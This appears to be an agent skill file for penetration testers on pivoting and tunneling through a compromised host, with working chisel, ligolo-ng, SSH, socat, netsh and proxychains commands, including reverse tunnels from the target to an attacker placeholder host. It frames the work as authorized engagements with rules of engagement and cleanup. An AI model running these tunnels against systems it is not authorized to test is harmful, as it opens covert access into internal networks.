---
name: pt-pivot
description: Use when reaching a network segment or service that is not directly accessible — setting up SOCKS proxies, port forwards, reverse tunnels, chained pivots through multiple hosts, or routing tooling through a compromised machine — including Russian requests (пивот, туннель, проксирование через хост, достучаться до внутренней сети). Use after any foothold must become reachability.
version: 1.0.0
author: operator
tags: [offensive, pivot, tunneling, socks, proxychains, lateral]
---

# Pivoting and Tunneling

A pivot is **reachability**, not access. Keep a path table and test every hop before sending a scanner through it.

## Decision table

| Need | Tool | Direction |
|---|---|---|
| Reach many ports/hosts from my box | SOCKS proxy (`chisel`, `ligolo`, `ssh -D`) | Reverse |
| One port, one service | Local forward (`ssh -L`) | Forward |
| Expose my listener to the target's network | Remote forward (`ssh -R`) | Reverse |
| Full IP-level routing, no SOCKS | `ligolo-ng` (TUN interface) | Reverse |
| No SSH, no binaries, only a shell | `socat`, `netsh portproxy`, `meterpreter portfwd` | Either |
| Egress filtered to DNS | `iodine`, `dnscat2` | Reverse |

## chisel — fastest SOCKS

```bash
# Attacker
chisel server -p 8080 --reverse --socks5

# Target (any OS, single static binary)
./chisel client http://<attacker>:8080 R:socks
# now: socks5 127.0.0.1:1080 on the attacker
```

Named forwards for stability across multiple hops:

```bash
./chisel client http://<attacker>:8080 R:1080:socks R:3389:10.10.5.20:3389
```

## ligolo-ng — routing without SOCKS

Preferred when you need `nmap` behaviour (SYN, ICMP, UDP) or many tools without proxy support.

```bash
# Attacker
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up
./proxy -selfcert -laddr 0.0.0.0:11601

# Target
./agent -connect <attacker>:11601 -ignore-cert

# In the proxy console
session            # pick the agent
ifconfig           # see target-side networks
start              # begin tunnel
# then add a route on the attacker
sudo ip route add 10.10.5.0/24 dev ligolo
```

Now the target's networks are directly routable — no proxychains, no `-sT` limitation.

## SSH tunnels

```bash
# Local forward: reach internal:80 through the pivot
ssh -N -L 8080:10.10.5.20:80 user@pivot

# Dynamic SOCKS
ssh -N -D 1080 user@pivot

# Remote forward: expose my listener on the pivot's network
ssh -N -R 4444:127.0.0.1:4444 user@pivot

# Jump chain
ssh -J user@pivot1,user@pivot2 user@10.10.9.9
```

Persist with `-f -N`, `ServerAliveInterval 30`, and an `~/.ssh/config` entry per engagement (never leave keys behind).

## Windows without SSH

```cmd
:: netsh port proxy (needs admin)
netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=10.10.5.20
netsh interface portproxy show all

:: or a single-binary forwarder
.\socat.exe TCP-LISTEN:8080,fork TCP:10.10.5.20:80
```

## proxychains

```ini
# /etc/proxychains4.conf
strict_chain
proxy_dns
tcp_read_time_out 15000
tcp_connect_time_out 8000
[ProxyList]
socks5 127.0.0.1 1080
```

Rules that keep proxy work sane:

- `nmap -sT -Pn -n` — no SYN scan, no host discovery through a SOCKS proxy.
- `curl --socks5-hostname 127.0.0.1:1080 https://internal/` — `-hostname` makes DNS resolve at the pivot.
- Slow is normal. Reduce threads (`ffuf -t 10`, `nmap --max-rate 100`).
- ICMP and UDP do not traverse SOCKS. Use ligolo for those.

## Chained pivots

```text
Me --socks(1080)--> Pivot1 --tunnel--> Pivot2 --route--> 10.10.9.0/24
```

Two workable patterns:

1. **Nested proxies:** run a second `chisel`/`ligolo` agent *from Pivot1* to connect to Pivot2, then chain entries in `proxychains` (`strict_chain` with two proxies). Works, fragile, slow.
2. **Route stacking with ligolo:** a session on Pivot1 plus a session on Pivot2, each with its own TUN route. Cleanest for large networks.

Record the full chain in `notes\pivot-<segment>.md` — including which host can be lost without killing access.

## Verification before scanning

```bash
curl --socks5-hostname 127.0.0.1:1080 -s -o /dev/null -w '%{http_code}\n' http://10.10.5.20/
proxychains4 -q nmap -sT -Pn -p 22,80,443 10.10.5.20
```

If the hop does not answer, do not start a /24 sweep — you will spend an hour blaming the tooling.

## OPSEC

- Pivots generate egress traffic; the client's proxy/firewall sees it. Match RoE.
- Bind SOCKS to `127.0.0.1` on the attacker, never `0.0.0.0`, unless intentionally exposing.
- Tunnel traffic is plaintext unless wrapped in TLS (`chisel` over HTTPS, `ligolo` with `-selfcert`, `ssh` with a key).
- Kill all tunnels at engagement end and confirm the processes are gone on every pivot host.

## Common mistakes

| Mistake | Reality |
|---|---|
| SYN scan through SOCKS | Silently wrong results; use `-sT` |
| Forgetting `proxy_dns` | DNS leaks to the operator's resolver |
| One-hop tunnel with no fallback | A rebooted pivot kills the engagement |
| Scanning before verifying the tunnel | Hours lost to "the network is down" |
| Leaving `socat` listeners open | Exposed service on the client network |
| Using ligolo without a route entry | Tunnel is up, traffic goes nowhere |
| Not documenting the chain | Nobody can reproduce the access for the report |
